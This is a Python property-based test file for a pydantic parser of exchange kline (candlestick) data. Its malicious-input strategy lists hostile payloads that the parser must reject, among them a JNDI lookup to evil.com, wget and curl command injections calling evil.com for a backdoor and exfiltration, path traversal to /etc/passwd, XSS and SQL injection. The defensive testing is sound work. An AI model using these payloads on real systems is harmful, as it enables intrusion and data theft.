"""Property-based tests for Backpack raw kline (candlestick) models.

These tests validate critical security boundary models that process external market kline data.
The models tested here are essential for candlestick charting, OHLCV analysis, and technical indicators.

SECURITY CRITICAL: These raw models protect against:
- Malicious kline data that could manipulate market analysis
- Financial precision errors in OHLCV calculations
- Buffer overflow attacks through oversized kline values
- Injection attacks through malformed kline structures
- Timestamp manipulation that could affect chart data
- Volume manipulation affecting trading decisions

Property testing ensures comprehensive coverage of kline edge cases and adversarial inputs.
"""

from decimal import Decimal
from typing import Any

import pytest
from hypothesis import given, strategies as st, assume
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.backpack.models.bp_raw_kline import BackpackRawKlineResponse
from cyberdelta.apis.exceptions.parsing import KlineTypeError, SequenceLengthError
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR KLINE MODEL TESTING
# =============================================================================


def kline_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for kline OHLCV fields."""
    return st.one_of([
        # Market price/volume amounts
        st.decimals(min_value=Decimal("0"), max_value=Decimal("10000000"), places=8).map(str),
        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000"), places=6).map(str),
        # Common kline values
        st.just("0"),
        st.just("0.0"),
        st.just("0.01"),  # Minimum tick
        st.just("50000.00"),  # BTC price
        st.just("0.00000001"),  # Minimum precision
        st.just("999999.99999999"),  # Large price
        st.just("1000.123"),  # Volume with precision
        st.just("101000.456"),  # Quote volume
        # Scientific notation (valid for decimal parsing)
        st.just("1e6"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def kline_timestamp_strategy() -> SearchStrategy[int]:
    """Generate valid timestamp integers for kline data."""
    return st.one_of([
        # Unix timestamps (milliseconds)
        st.integers(min_value=1000000000000, max_value=2000000000000),
        # Common patterns
        st.just(1700000000000),  # Start time
        st.just(1700000059999),  # End time
        st.just(1678886400000),  # Standard timestamp
        # Edge cases
        st.just(0),  # Minimum
        st.integers(min_value=0, max_value=2**53 - 1),  # JavaScript safe range
    ])


def kline_trade_count_strategy() -> SearchStrategy[int]:
    """Generate valid trade count integers."""
    return st.one_of([
        # Common ranges
        st.integers(min_value=0, max_value=10000),
        # Specific values
        st.just(0),  # No trades
        st.just(1),  # Single trade
        st.just(50),  # Moderate activity
        st.just(1000),  # High activity
        # Edge cases
        st.integers(min_value=0, max_value=2**31 - 1),
    ])


def kline_ignored_field_strategy() -> SearchStrategy[str]:
    """Generate valid ignored field strings."""
    return st.one_of([
        # Common patterns
        st.just("0"),
        st.just("1"),
        st.just("ignored"),
        st.just("unused"),
        # Valid strings
        st.text(
            min_size=1,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-."
            ),
        ),
        # Edge cases
        st.text(min_size=1, max_size=64).filter(
            lambda x: x.strip() and len(x.encode("utf-8")) <= 64
        ),
    ])


@st.composite
def valid_kline_list_data(draw) -> list[Any]:
    """Generate valid kline list data structure."""
    return [
        draw(kline_timestamp_strategy()),  # startTimeMs
        draw(kline_decimal_strategy()),  # openPrice
        draw(kline_decimal_strategy()),  # highPrice
        draw(kline_decimal_strategy()),  # lowPrice
        draw(kline_decimal_strategy()),  # closePrice
        draw(kline_decimal_strategy()),  # volume
        draw(kline_timestamp_strategy()),  # endTimeMs
        draw(kline_decimal_strategy()),  # quoteVolume
        draw(kline_trade_count_strategy()),  # tradeCount
        draw(kline_decimal_strategy()),  # takerBuyBaseVolume
        draw(kline_decimal_strategy()),  # takerBuyQuoteVolume
        draw(kline_ignored_field_strategy()),  # ignored
    ]


@st.composite
def valid_ohlc_kline_list_data(draw) -> list[Any]:
    """Generate valid kline list data with realistic OHLC relationships."""
    # Generate base price and derive OHLC from it
    base_price = draw(st.decimals(min_value=Decimal("1"), max_value=Decimal("100000"), places=6))

    # Generate realistic price variations (±10% of base price)
    price_variation = base_price * Decimal("0.1")

    open_price = base_price + draw(
        st.decimals(min_value=-price_variation, max_value=price_variation, places=6)
    )
    close_price = base_price + draw(
        st.decimals(min_value=-price_variation, max_value=price_variation, places=6)
    )

    # High should be >= max(open, close), Low should be <= min(open, close)
    max_oc = max(open_price, close_price)
    min_oc = min(open_price, close_price)

    high_price = max_oc + draw(
        st.decimals(min_value=Decimal("0"), max_value=price_variation, places=6)
    )
    low_price = min_oc - draw(
        st.decimals(min_value=Decimal("0"), max_value=price_variation, places=6)
    )

    # Ensure low is not negative
    if low_price < 0:
        low_price = Decimal("0.01")

    return [
        draw(kline_timestamp_strategy()),  # startTimeMs
        str(open_price),  # openPrice
        str(high_price),  # highPrice
        str(low_price),  # lowPrice
        str(close_price),  # closePrice
        draw(kline_decimal_strategy()),  # volume
        draw(kline_timestamp_strategy()),  # endTimeMs
        draw(kline_decimal_strategy()),  # quoteVolume
        draw(kline_trade_count_strategy()),  # tradeCount
        draw(kline_decimal_strategy()),  # takerBuyBaseVolume
        draw(kline_decimal_strategy()),  # takerBuyQuoteVolume
        draw(kline_ignored_field_strategy()),  # ignored
    ]


def malicious_kline_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for kline security testing."""
    return st.one_of([
        # Financial manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-klines}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('kline-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE klines;--"),
        st.just("1' UNION SELECT * FROM prices--"),
        # Buffer overflow attempts
        st.text(min_size=10000, max_size=50000),
        st.just("K" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.klines.find(); //"),
        # JSON injection
        st.just('{"$where": "this.price > 1000000"}'),
        # Kline manipulation
        st.just("100.0'; UPDATE klines SET high=0;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


def invalid_kline_structure_strategy() -> SearchStrategy[Any]:
    """Generate invalid structures for kline validation testing."""
    return st.one_of([
        # Wrong types
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.text(),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
        # Wrong list lengths
        st.lists(st.text(), min_size=0, max_size=11),  # Too short
        st.lists(st.text(), min_size=13, max_size=20),  # Too long
        # Empty collections
        st.just([]),
        st.just({}),
        # Nested structures
        st.lists(st.dictionaries(st.text(), st.integers())),
        st.dictionaries(st.text(), st.lists(st.text())),
    ])


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW KLINE RESPONSE MODEL
# =============================================================================


class TestBackpackRawKlineResponseProperties:
    """Property-based tests for BackpackRawKlineResponse validation and security."""

    @given(kline_data=valid_kline_list_data())
    def test_kline_validation_success_properties(self, kline_data: list[Any]) -> None:
        """Property: Valid kline data should always create valid BackpackRawKlineResponse objects."""
        # Skip invalid decimal values
        try:
            decimal_indices = [1, 2, 3, 4, 5, 7, 9, 10]  # OHLCV and taker volumes
            for idx in decimal_indices:
                decimal_val = Decimal(kline_data[idx])
                assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip invalid timestamps
        assume(isinstance(kline_data[0], int) and kline_data[0] >= 0)  # startTimeMs
        assume(isinstance(kline_data[6], int) and kline_data[6] >= 0)  # endTimeMs
        assume(isinstance(kline_data[8], int) and kline_data[8] >= 0)  # tradeCount

        # Skip empty or invalid ignored field
        assume(isinstance(kline_data[11], str) and kline_data[11].strip())
        assume(len(kline_data[11].encode("utf-8")) <= 64)

        obj = BackpackRawKlineResponse.model_validate(kline_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawKlineResponse)

        # Property: All fields should be preserved with correct types
        assert obj.start_time_ms == kline_data[0]
        assert obj.open_price == Decimal(kline_data[1])
        assert obj.high_price == Decimal(kline_data[2])
        assert obj.low_price == Decimal(kline_data[3])
        assert obj.close_price == Decimal(kline_data[4])
        assert obj.volume == Decimal(kline_data[5])
        assert obj.end_time_ms == kline_data[6]
        assert obj.quote_volume == Decimal(kline_data[7])
        assert obj.trade_count == kline_data[8]
        assert obj.taker_buy_base_volume == Decimal(kline_data[9])
        assert obj.taker_buy_quote_volume == Decimal(kline_data[10])
        assert obj.ignored == kline_data[11]

        # Property: Decimal fields should be parseable as finite decimals
        assert obj.open_price.is_finite()
        assert obj.high_price.is_finite()
        assert obj.low_price.is_finite()
        assert obj.close_price.is_finite()
        assert obj.volume.is_finite()
        assert obj.quote_volume.is_finite()
        assert obj.taker_buy_base_volume.is_finite()
        assert obj.taker_buy_quote_volume.is_finite()

        # Property: Integer fields should be non-negative
        assert obj.start_time_ms >= 0
        assert obj.end_time_ms >= 0
        assert obj.trade_count >= 0

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True
        assert obj.model_config.get("populate_by_name") is True

    @given(kline_data=valid_ohlc_kline_list_data())
    def test_kline_ohlc_properties(self, kline_data: list[Any]) -> None:
        """Property: Valid OHLC kline data should create consistent objects."""
        # This test ensures we can handle realistic OHLC relationships
        # Note: Raw models don't enforce OHLC business logic per policy

        # Skip invalid decimal values
        try:
            for idx in [1, 2, 3, 4, 5, 7, 9, 10]:
                decimal_val = Decimal(kline_data[idx])
                assume(decimal_val.is_finite() and decimal_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Skip invalid timestamps and counts
        assume(isinstance(kline_data[0], int) and kline_data[0] >= 0)
        assume(isinstance(kline_data[6], int) and kline_data[6] >= 0)
        assume(isinstance(kline_data[8], int) and kline_data[8] >= 0)
        assume(isinstance(kline_data[11], str) and kline_data[11].strip())

        obj = BackpackRawKlineResponse.model_validate(kline_data)

        # Property: Object should be created successfully with realistic OHLC
        assert isinstance(obj, BackpackRawKlineResponse)

        # Property: All decimal fields should be finite and non-negative
        ohlcv_fields = [obj.open_price, obj.high_price, obj.low_price, obj.close_price, obj.volume]
        for field in ohlcv_fields:
            assert field.is_finite()
            assert field >= 0

    @given(
        field_index=st.integers(min_value=0, max_value=11),
        malicious_value=malicious_kline_strategy(),
    )
    def test_kline_security_boundary_properties(
        self, field_index: int, malicious_value: Any
    ) -> None:
        """Property: Kline model should reject malicious inputs safely."""
        base_data = [
            1700000000000,  # startTimeMs
            "100.0",  # openPrice
            "102.5",  # highPrice
            "99.5",  # lowPrice
            "101.0",  # closePrice
            "1000.123",  # volume
            1700000059999,  # endTimeMs
            "101000.456",  # quoteVolume
            50,  # tradeCount
            "500.1",  # takerBuyBaseVolume
            "50500.2",  # takerBuyQuoteVolume
            "0",  # ignored
        ]
        base_data[field_index] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            KlineTypeError,
            SequenceLengthError,
        )):
            BackpackRawKlineResponse.model_validate(base_data)

    @given(invalid_structure=invalid_kline_structure_strategy())
    def test_kline_structure_validation_properties(self, invalid_structure: Any) -> None:
        """Property: Kline model should reject invalid structures safely."""
        # Property: Invalid structures should be rejected
        with pytest.raises((ValidationError, TypeError, SequenceLengthError)) as exc_info:
            BackpackRawKlineResponse.model_validate(invalid_structure)

        # Property: Error should be informative about structure requirement
        error_msg = str(exc_info.value)
        structure_related = any(
            phrase in error_msg.lower()
            for phrase in ["expected 12-element", "list", "tuple", "length", "sequence"]
        )
        assert structure_related, f"Error should mention structure requirements: {error_msg}"

    @given(list_length=st.integers(min_value=0, max_value=20).filter(lambda x: x != 12))
    def test_kline_length_validation_properties(self, list_length: int) -> None:
        """Property: Kline model should reject lists with wrong length."""
        # Generate list with wrong length
        if list_length < 12:
            wrong_length_list = ["value"] * list_length
        else:
            wrong_length_list = ["value"] * list_length

        # Property: Wrong length should be rejected
        with pytest.raises((ValidationError, SequenceLengthError)) as exc_info:
            BackpackRawKlineResponse.model_validate(wrong_length_list)

        # Property: Error should mention expected length
        error_msg = str(exc_info.value)
        assert "12" in error_msg, f"Error should mention expected length 12: {error_msg}"
        assert str(list_length) in error_msg, (
            f"Error should mention actual length {list_length}: {error_msg}"
        )

    @given(
        decimal_index=st.sampled_from([1, 2, 3, 4, 5, 7, 9, 10]),  # OHLCV indices
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0"),
            st.just("1000.50"),
            st.just("1e6"),
            st.just("2.5e-4"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ]),
    )
    def test_kline_decimal_validation_properties(
        self, decimal_index: int, decimal_value: str
    ) -> None:
        """Property: Kline decimal fields should validate properly."""
        kline_data = [
            1700000000000,  # startTimeMs
            "100.0",  # openPrice
            "102.5",  # highPrice
            "99.5",  # lowPrice
            "101.0",  # closePrice
            "1000.123",  # volume
            1700000059999,  # endTimeMs
            "101000.456",  # quoteVolume
            50,  # tradeCount
            "500.1",  # takerBuyBaseVolume
            "50500.2",  # takerBuyQuoteVolume
            "0",  # ignored
        ]
        kline_data[decimal_index] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()

            if is_finite and not is_empty and decimal_val >= 0:
                # Property: Valid finite non-negative decimals should be accepted
                obj = BackpackRawKlineResponse.model_validate(kline_data)
                field_names = [
                    "open_price",
                    "high_price",
                    "low_price",
                    "close_price",
                    "volume",
                    "quote_volume",
                    "taker_buy_base_volume",
                    "taker_buy_quote_volume",
                ]
                decimal_field_map = {1: 0, 2: 1, 3: 2, 4: 3, 5: 4, 7: 5, 9: 6, 10: 7}
                field_name = field_names[decimal_field_map[decimal_index]]
                field_value = getattr(obj, field_name)
                assert field_value == decimal_val
            else:
                # Property: Non-finite, empty, or negative values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, KlineTypeError)):
                    BackpackRawKlineResponse.model_validate(kline_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises((ValidationError, KlineTypeError)):
                BackpackRawKlineResponse.model_validate(kline_data)

    @given(
        timestamp_index=st.sampled_from([0, 6, 8]),  # startTimeMs, endTimeMs, tradeCount
        timestamp_value=st.one_of([
            # Valid integers
            st.integers(min_value=0, max_value=2**53 - 1),
            st.just(0),
            st.just(1700000000000),
            # Invalid integers
            st.integers(min_value=-1000, max_value=-1),  # Negative
            # Invalid types
            st.just("1700000000000"),  # String
            st.just(1700000000000.5),  # Float
            st.just(True),  # Boolean
            st.just(None),  # None
            st.lists(st.integers()),  # List
        ]),
    )
    def test_kline_integer_validation_properties(
        self, timestamp_index: int, timestamp_value: Any
    ) -> None:
        """Property: Kline integer fields should validate properly."""
        kline_data = [
            1700000000000,  # startTimeMs
            "100.0",  # openPrice
            "102.5",  # highPrice
            "99.5",  # lowPrice
            "101.0",  # closePrice
            "1000.123",  # volume
            1700000059999,  # endTimeMs
            "101000.456",  # quoteVolume
            50,  # tradeCount
            "500.1",  # takerBuyBaseVolume
            "50500.2",  # takerBuyQuoteVolume
            "0",  # ignored
        ]
        kline_data[timestamp_index] = timestamp_value

        if isinstance(timestamp_value, int) and timestamp_value >= 0:
            # Property: Valid non-negative integers should be accepted
            obj = BackpackRawKlineResponse.model_validate(kline_data)
            field_names = ["start_time_ms", "end_time_ms", "trade_count"]
            timestamp_field_map = {0: 0, 6: 1, 8: 2}
            field_name = field_names[timestamp_field_map[timestamp_index]]
            field_value = getattr(obj, field_name)
            assert field_value == timestamp_value
        else:
            # Property: Non-integers or negative values should be rejected
            with pytest.raises((ValidationError, TypeFieldError)):
                BackpackRawKlineResponse.model_validate(kline_data)

    @given(
        ignored_value=st.one_of([
            # Valid strings
            st.text(min_size=1, max_size=64).filter(lambda x: x.strip()),
            st.just("0"),
            st.just("ignored"),
            st.just("unused"),
            # Invalid strings
            st.just(""),  # Empty
            st.just("   "),  # Whitespace only
            st.text(min_size=65, max_size=100),  # Too long
            # Invalid types
            st.integers(),
            st.floats(),
            st.booleans(),
            st.none(),
            st.lists(st.text()),
        ])
    )
    def test_kline_ignored_field_validation_properties(self, ignored_value: Any) -> None:
        """Property: Kline ignored field should validate properly."""
        kline_data = [
            1700000000000,  # startTimeMs
            "100.0",  # openPrice
            "102.5",  # highPrice
            "99.5",  # lowPrice
            "101.0",  # closePrice
            "1000.123",  # volume
            1700000059999,  # endTimeMs
            "101000.456",  # quoteVolume
            50,  # tradeCount
            "500.1",  # takerBuyBaseVolume
            "50500.2",  # takerBuyQuoteVolume
            ignored_value,  # ignored
        ]

        if (
            isinstance(ignored_value, str)
            and ignored_value.strip()
            and len(ignored_value.encode("utf-8")) <= 64
        ):
            # Property: Valid non-empty strings within length limit should be accepted
            obj = BackpackRawKlineResponse.model_validate(kline_data)
            assert obj.ignored == ignored_value
        else:
            # Property: Invalid ignored values should be rejected
            with pytest.raises((ValidationError, EmptyStringError, KlineTypeError, TypeFieldError)):
                BackpackRawKlineResponse.model_validate(kline_data)

    @given(kline_data=valid_kline_list_data())
    def test_kline_immutability_properties(self, kline_data: list[Any]) -> None:
        """Property: Kline objects should be immutable after creation."""
        # Skip invalid data
        try:
            for idx in [1, 2, 3, 4, 5, 7, 9, 10]:
                decimal_val = Decimal(kline_data[idx])
                assume(decimal_val.is_finite() and decimal_val >= 0)

            assume(isinstance(kline_data[0], int) and kline_data[0] >= 0)
            assume(isinstance(kline_data[6], int) and kline_data[6] >= 0)
            assume(isinstance(kline_data[8], int) and kline_data[8] >= 0)
            assume(isinstance(kline_data[11], str) and kline_data[11].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawKlineResponse.model_validate(kline_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.open_price = Decimal("999.99")

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.trade_count = 9999

    @given(kline_data=valid_kline_list_data())
    def test_kline_financial_precision_properties(self, kline_data: list[Any]) -> None:
        """Property: Kline model should preserve financial precision exactly."""
        # Only test valid finite decimals
        try:
            decimal_indices = [1, 2, 3, 4, 5, 7, 9, 10]
            decimal_values = []
            for idx in decimal_indices:
                decimal_val = Decimal(kline_data[idx])
                assume(decimal_val.is_finite() and decimal_val >= 0)
                decimal_values.append(decimal_val)

            assume(isinstance(kline_data[0], int) and kline_data[0] >= 0)
            assume(isinstance(kline_data[6], int) and kline_data[6] >= 0)
            assume(isinstance(kline_data[8], int) and kline_data[8] >= 0)
            assume(isinstance(kline_data[11], str) and kline_data[11].strip())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawKlineResponse.model_validate(kline_data)

        # Property: Decimal values should be preserved exactly
        assert obj.open_price == decimal_values[0]
        assert obj.high_price == decimal_values[1]
        assert obj.low_price == decimal_values[2]
        assert obj.close_price == decimal_values[3]
        assert obj.volume == decimal_values[4]
        assert obj.quote_volume == decimal_values[5]
        assert obj.taker_buy_base_volume == decimal_values[6]
        assert obj.taker_buy_quote_volume == decimal_values[7]

        # Property: All values should remain finite
        assert obj.open_price.is_finite()
        assert obj.high_price.is_finite()
        assert obj.low_price.is_finite()
        assert obj.close_price.is_finite()
        assert obj.volume.is_finite()
        assert obj.quote_volume.is_finite()
        assert obj.taker_buy_base_volume.is_finite()
        assert obj.taker_buy_quote_volume.is_finite()

    @given(adversarial_data=st.lists(malicious_kline_strategy(), min_size=12, max_size=12))
    def test_kline_adversarial_input_properties(self, adversarial_data: list[Any]) -> None:
        """Property: Kline model should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            KlineTypeError,
        )):
            BackpackRawKlineResponse.model_validate(adversarial_data)

    @given(tuple_data=valid_kline_list_data())
    def test_kline_tuple_input_properties(self, tuple_data: list[Any]) -> None:
        """Property: Kline model should accept both list and tuple inputs."""
        # Skip invalid data
        try:
            for idx in [1, 2, 3, 4, 5, 7, 9, 10]:
                decimal_val = Decimal(tuple_data[idx])
                assume(decimal_val.is_finite() and decimal_val >= 0)

            assume(isinstance(tuple_data[0], int) and tuple_data[0] >= 0)
            assume(isinstance(tuple_data[6], int) and tuple_data[6] >= 0)
            assume(isinstance(tuple_data[8], int) and tuple_data[8] >= 0)
            assume(isinstance(tuple_data[11], str) and tuple_data[11].strip())
        except (ValueError, TypeError):
            assume(False)

        # Property: Both list and tuple should work equivalently
        list_obj = BackpackRawKlineResponse.model_validate(tuple_data)
        tuple_obj = BackpackRawKlineResponse.model_validate(tuple(tuple_data))

        # Property: Both should create equivalent objects
        assert list_obj.start_time_ms == tuple_obj.start_time_ms
        assert list_obj.open_price == tuple_obj.open_price
        assert list_obj.high_price == tuple_obj.high_price
        assert list_obj.close_price == tuple_obj.close_price
        assert list_obj.volume == tuple_obj.volume
        assert list_obj.trade_count == tuple_obj.trade_count


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_BackpackRawKlineResponse_real_world_example() -> None:
    """Test with real-world kline data."""
    payload = [
        1700000000000,  # startTimeMs
        "50000.00",  # openPrice
        "50250.50",  # highPrice
        "49750.25",  # lowPrice
        "50100.75",  # closePrice
        "125.456789",  # volume
        1700000059999,  # endTimeMs
        "6275000.123456",  # quoteVolume
        1500,  # tradeCount
        "62.789012",  # takerBuyBaseVolume
        "3140000.567890",  # takerBuyQuoteVolume
        "0",  # ignored
    ]
    obj = BackpackRawKlineResponse.model_validate(payload)
    assert obj.start_time_ms == 1700000000000
    assert obj.open_price == Decimal("50000.00")
    assert obj.high_price == Decimal("50250.50")
    assert obj.low_price == Decimal("49750.25")
    assert obj.close_price == Decimal("50100.75")
    assert obj.volume == Decimal("125.456789")
    assert obj.end_time_ms == 1700000059999
    assert obj.quote_volume == Decimal("6275000.123456")
    assert obj.trade_count == 1500
    assert obj.taker_buy_base_volume == Decimal("62.789012")
    assert obj.taker_buy_quote_volume == Decimal("3140000.567890")
    assert obj.ignored == "0"


def test_BackpackRawKlineResponse_edge_case_example() -> None:
    """Test with edge case kline data."""
    payload = [
        0,  # startTimeMs (minimum)
        "0.00000001",  # openPrice (minimum precision)
        "0.00000002",  # highPrice
        "0.00000001",  # lowPrice
        "0.00000001",  # closePrice
        "0",  # volume (zero volume)
        59999,  # endTimeMs
        "0",  # quoteVolume (zero)
        0,  # tradeCount (no trades)
        "0",  # takerBuyBaseVolume
        "0",  # takerBuyQuoteVolume
        "unused",  # ignored
    ]
    obj = BackpackRawKlineResponse.model_validate(payload)
    assert obj.start_time_ms == 0
    assert obj.open_price == Decimal("0.00000001")
    assert obj.high_price == Decimal("0.00000002")
    assert obj.low_price == Decimal("0.00000001")
    assert obj.close_price == Decimal("0.00000001")
    assert obj.volume == Decimal("0")
    assert obj.end_time_ms == 59999
    assert obj.quote_volume == Decimal("0")
    assert obj.trade_count == 0
    assert obj.taker_buy_base_volume == Decimal("0")
    assert obj.taker_buy_quote_volume == Decimal("0")
    assert obj.ignored == "unused"


def test_BackpackRawKlineResponse_tuple_input_example() -> None:
    """Test with tuple input instead of list."""
    payload = (
        1700000000000,  # startTimeMs
        "100.0",  # openPrice
        "102.5",  # highPrice
        "99.5",  # lowPrice
        "101.0",  # closePrice
        "1000.123",  # volume
        1700000059999,  # endTimeMs
        "101000.456",  # quoteVolume
        50,  # tradeCount
        "500.1",  # takerBuyBaseVolume
        "50500.2",  # takerBuyQuoteVolume
        "0",  # ignored
    )
    obj = BackpackRawKlineResponse.model_validate(payload)
    assert obj.start_time_ms == 1700000000000
    assert obj.open_price == Decimal("100.0")
    assert obj.high_price == Decimal("102.5")
    assert obj.low_price == Decimal("99.5")
    assert obj.close_price == Decimal("101.0")
    assert obj.volume == Decimal("1000.123")
    assert obj.trade_count == 50
